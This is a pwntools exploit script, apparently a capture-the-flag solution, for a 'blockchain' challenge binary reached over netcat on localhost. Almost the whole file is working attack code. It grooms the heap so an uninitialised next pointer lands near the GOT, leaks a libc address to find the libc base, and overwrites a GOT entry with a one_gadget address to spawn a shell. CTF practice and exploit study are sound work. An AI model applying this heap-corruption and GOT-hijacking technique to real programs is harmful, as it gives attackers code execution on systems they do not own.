from pwn import *

from exploit import *
p = exploit_source("./dist/blockchain.o", "nc localhost 13021")

bin = ELF("./dist/blockchain.o")
libc = ELF("./dist/libc.so.6")

def add(len, content, title):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Length > ", str(len))
    p.sendafter("Content > ", content)
    p.sendafter("Title > ", title)

def rmv(hash):
    p.sendlineafter("> ", "2")
    p.sendlineafter("Hash > ", str(hash))

def view(hash):
    p.sendlineafter("> ", "3")
    p.sendlineafter("Hash > ", str(hash))

def edit(hash, len, content, title):
    p.sendlineafter("> ", "4")
    p.sendlineafter("Hash > ", str(hash))
    p.sendlineafter("Length > ", str(len))
    p.sendafter("Content > ", content)
    p.sendafter("Title > ", title)

def hashb(b):
    hash = 0
    for i in b:
        hash = (hash + 31 * i) & ((1 << 64) - 1)
    return hash

last_got_entry = bin.got.exit + 8
nextoverwrite = flat({ 0x38: p64(last_got_entry - 0x28)}, length=0x40)

add(0x60, "A"*0x60, "A"*0x20)
add(0x40, nextoverwrite, "B"*0x20) # same size as the block struct
add(0x60, "C"*0x60, "C"*0x20) # prevents consolidation with top chunk

rmv(hashb(nextoverwrite)) # in the 0x40 bin, there are two chunks: B header -> nextoverwrite

add(0x60, "D"*0x60, "D"*0x20) # allocate B header as D header
# allocate nextoverwrite as E header
# E's .next field is nextoverwritee's last 8 bytes, as allocate does not init the .next field to 0
add(0x60, "E"*0x60, "E"*0x20)

view(0)

p.recvuntil("Title: ")
read = u64(p.recvn(6).ljust(8, b'\0'))
libc.address = read - libc.symbols.read
success(f"{hex(libc.address) = }")

edit(0, 1, 'A', flat({ 0x18: p64(libc.address + [932606, 932609, 932612][1]) }, length=0x20))


p.interactive()